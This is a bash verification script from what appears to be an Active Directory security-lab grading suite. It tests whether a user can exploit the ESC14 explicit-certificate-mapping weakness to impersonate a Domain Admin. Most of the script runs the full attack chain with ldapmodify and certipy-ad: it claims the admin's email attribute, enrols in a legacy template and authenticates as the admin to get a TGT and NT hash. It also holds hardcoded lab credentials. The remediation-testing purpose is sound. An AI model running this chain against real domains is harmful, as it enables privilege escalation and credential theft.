#!/usr/bin/env bash
# meta4/ad-vm/scenario-01/verify-poc.sh
# PASS (exit 0) iff alice CANNOT impersonate the Domain Admin `legacyops`
# through its explicit certificate mapping (ESC14).
#
# REPLACES the former Zerologon PoC. CVE-2020-1472 cannot be induced on a
# current Server 2019 -- the fix is in code, not configuration -- so the
# scenario was unwinnable by construction. This grades a weakness that IS
# present and IS reachable on this image.
#
# The chain, all with alice's ordinary Domain User rights:
#
#   1. write alice's own mail attribute to legacyops@corp.local, using the
#      self-service delegation the inject grants (users maintaining their own
#      contact details is ordinary, and is setup here, not the finding)
#   2. enrol in the legacy template, which copies mail into the certificate's
#      RFC822 SAN and suppresses the SID extension, so the KDC must fall back
#      to explicit mapping
#   3. authenticate with that certificate
#
# On a DC in Compatibility mode with a weak X509:<RFC822> mapping, step 3
# returns legacyops' TGT and NT hash. The certificate is legitimately issued to
# alice -- no template abuse is involved, which is what distinguishes ESC14
# from ESC1/ESC2/ESC6 (scenarios 07/08/10).
#
# The probe RESTORES alice's mail afterwards, so a failed or repeated run does
# not leave the directory holding a collision that would make the next gate
# read as vulnerable for the wrong reason.

set -uo pipefail

DC_IP=10.20.30.5
CA_HOST='corp-ca01.corp.local'
CA_NAME='corp-ca01-CA'
TARGET_MAIL='legacyops@corp.local'
ALICE='corp.local/alice:Password1!'

for t in /usr/bin/certipy-ad /usr/bin/impacket-getTGT; do
    if [ ! -x "$t" ]; then
        echo "[verify-poc-01] HARNESS ERROR: $t missing or not executable" >&2
        exit 2
    fi
done
if ! command -v ldapmodify >/dev/null 2>&1; then
    echo "[verify-poc-01] HARNESS ERROR: ldapmodify (ldap-utils) not present" >&2
    exit 2
fi

WORK=$(mktemp -d) || { echo "[verify-poc-01] HARNESS ERROR: mktemp failed" >&2; exit 2; }
cd "$WORK" || exit 2

# Discover alice's DN rather than assuming it.
#
# It was hardcoded to CN=alice,CN=Users,DC=corp,DC=local and the lab actually
# places her in CN=alice,OU=Corp,DC=corp,DC=local, so every run died with
# "ldap_modify: No such object (32)". An attacker would look the DN up, and a
# grader that hardcodes container placement breaks the moment a lab is
# reorganised.
ALICE_DN=$(ldapsearch -x -LLL -H "ldap://$DC_IP" \
    -D 'alice@corp.local' -w 'Password1!' \
    -b 'DC=corp,DC=local' '(sAMAccountName=alice)' dn 2>/dev/null \
    | sed -n 's/^dn: //p' | head -1)

if [ -z "$ALICE_DN" ]; then
    echo "[verify-poc-01] HARNESS ERROR: could not resolve alice's DN over LDAP" >&2
    exit 2
fi
echo "[verify-poc-01] attacker DN: $ALICE_DN"

restore_mail() {
    printf 'dn: %s\nchangetype: modify\ndelete: mail\n' "$ALICE_DN" > restore.ldif
    ldapmodify -x -H "ldap://$DC_IP" -D 'alice@corp.local' -w 'Password1!' \
        -f restore.ldif >/dev/null 2>&1 || true
}
trap restore_mail EXIT INT TERM

# --- step 1: claim the target's email on our own account ---
printf 'dn: %s\nchangetype: modify\nreplace: mail\nmail: %s\n' "$ALICE_DN" "$TARGET_MAIL" > set.ldif
SETOUT=$(ldapmodify -x -H "ldap://$DC_IP" -D 'alice@corp.local' -w 'Password1!' -f set.ldif 2>&1)
SET_RC=$?

echo "--- claim mail attribute (rc=$SET_RC) ---"
echo "$SETOUT"

if [ "$SET_RC" -ne 0 ]; then
    # Losing the self-write is a legitimate hardening outcome, but it is not
    # what this scenario grades and it is not the documented remediation, so
    # say so plainly rather than scoring it as a fix.
    if echo "$SETOUT" | grep -qiE 'Insufficient access|insufficientAccessRights'; then
        echo "[verify-poc-01] alice cannot write her own mail attribute -- the SAN cannot be claimed"
        echo "[verify-poc-01] ESC14 chain broken at step 1 -- PoC BLOCKED"
        exit 0
    fi
    echo "[verify-poc-01] HARNESS ERROR: could not modify alice's mail: $SETOUT" >&2
    exit 2
fi

# --- step 2: ordinary enrolment in the legacy template ---
REQ=$(timeout 90 /usr/bin/certipy-ad req \
    -u 'alice@corp.local' -p 'Password1!' \
    -ca "$CA_NAME" -target "$CA_HOST" -dc-ip "$DC_IP" \
    -template 'LegacyAppAuth' 2>&1 </dev/null)
REQ_RC=$?

echo "--- certipy req (rc=$REQ_RC) ---"
echo "$REQ"

if echo "$REQ" | grep -qiE 'ept_s_not_registered|Failed to get DCE RPC connection'; then
    echo "[verify-poc-01] HARNESS ERROR: CA RPC enrollment interface not reachable" >&2
    exit 2
fi
# A transport failure reaching the CA is not a verdict in either direction.
# Observed as "The NETBIOS connection with the remote host timed out." on a
# busy lab; without this it fell through to "no certificate issued", which
# reads as an inconclusive FAIL rather than as the lab problem it is.
if echo "$REQ" | grep -qiE 'NETBIOS connection.*timed out|Connection refused|Network is unreachable|No route to host|timed out'; then
    echo "[verify-poc-01] HARNESS ERROR: transport failure reaching the CA" >&2
    echo "[verify-poc-01] $(echo "$REQ" | grep -iE 'timed out|refused|unreachable' | head -1)" >&2
    exit 2
fi
if [ "$REQ_RC" -eq 124 ]; then
    echo "[verify-poc-01] HARNESS ERROR: enrolment timed out" >&2
    exit 2
fi

PFX=$(ls -1 ./*.pfx 2>/dev/null | head -1 || true)
if [ -z "$PFX" ]; then
    # CERTSRV_E_UNSUPPORTED_CERT_TYPE is a HARNESS ERROR here, not a denial.
    #
    # For scenarios 07-09 that message means the vulnerable template was
    # unpublished -- the remediation. Here the legacy template is part of the
    # SETUP, and the CA not serving it means the attack path was never built.
    # Grading it as "blocked" reported the scenario remediated on a host where
    # nothing had been injected, which is what failed gate 1 on the 2026-07-28
    # run: the CA had not reloaded its template list after inject published it.
    #
    # Unpublishing the legacy template is also not an accepted fix for this
    # scenario -- the legacy application depends on it -- so it must never
    # produce a pass by this route.
    if echo "$REQ" | grep -qiE 'CERTSRV_E_UNSUPPORTED_CERT_TYPE|0x80094800|not supported by this CA|template.*not found'; then
        echo "[verify-poc-01] HARNESS ERROR: the CA is not serving the legacy template" >&2
        echo "[verify-poc-01] the ESC14 attack path does not exist; inject did not take effect" >&2
        exit 2
    fi
    if echo "$REQ" | grep -qiE 'access_denied|enrollment.*denied'; then
        echo "[verify-poc-01] alice denied enrolment in the legacy template -- PoC BLOCKED"
        exit 0
    fi
    echo "[verify-poc-01] no certificate issued and no recognised denial - INCONCLUSIVE, grading FAIL" >&2
    exit 1
fi
echo "[verify-poc-01] certificate issued to alice: $PFX"

# --- step 3: does the KDC map that certificate onto legacyops? ---
# 'Y' rather than /dev/null: certipy prompts "Do you want to continue?" when the
# requested username differs from the identity in the certificate -- which is
# precisely the case under test. Feeding EOF aborted the attempt with
# "Authentication failed: EOF when reading a line", which read as inconclusive
# rather than as the impersonation it was about to perform.
AUTH=$(printf 'Y\n' | timeout 90 /usr/bin/certipy-ad auth -pfx "$PFX" -dc-ip "$DC_IP" \
        -username legacyops -domain corp.local 2>&1)
echo "--- certipy auth as legacyops ---"
echo "$AUTH"

# --- impersonation succeeded ---
if echo "$AUTH" | grep -qE "Got hash for '?legacyops|NT hash|AS-REP received"; then
    echo "[verify-poc-01] alice authenticated AS legacyops using a certificate issued to herself" >&2
    echo "[verify-poc-01] weak X509:<RFC822> mapping accepted in Compatibility mode -- ESC14 OPEN" >&2
    exit 1
fi
if echo "$AUTH" | grep -qiE 'Got TGT|Saved credential cache'; then
    echo "[verify-poc-01] alice obtained a TGT as legacyops via the explicit mapping -- ESC14 OPEN" >&2
    exit 1
fi

# --- explicitly refused ---
# KDC_ERR_CLIENT_NAME_MISMATCH is what a strong mapping returns when the
# presented certificate is not the one bound to the account. A SID-mismatch
# refusal means Full Enforcement is on, which is NOT the intended remediation
# here -- verify-service.ps1 fails that separately -- but from the attacker's
# side it is still a refusal.
# 'Name mismatch between certificate and user' is what this actually returns
# once the mapping is strong: the certificate no longer resolves to legacyops,
# so the KDC declines to issue for that principal. Measured on gate 2 with the
# X509IssuerSerialNumber mapping in place --
#
#   [*]     No identities found in this certificate
#   [-] Name mismatch between certificate and user 'legacyops'
#
# -- and it was unmatched, so a working compensating control graded as an
# inconclusive FAIL. Exactly the defect class this suite keeps hitting: the
# remediation succeeds and the check does not recognise the refusal it causes.
if echo "$AUTH" | grep -qiE 'Name mismatch between certificate and user|KDC_ERR_CLIENT_NAME_MISMATCH|no matching principal|certificate.*not.*mapp|Object SID mismatch|KDC_ERR_C_PRINCIPAL_UNKNOWN'; then
    echo "[verify-poc-01] KDC refused to map alice's certificate onto legacyops -- PoC BLOCKED"
    exit 0
fi

echo "[verify-poc-01] no recognised authentication result - INCONCLUSIVE, grading FAIL" >&2
echo "[verify-poc-01] an unreadable transcript is not evidence of remediation" >&2
exit 1
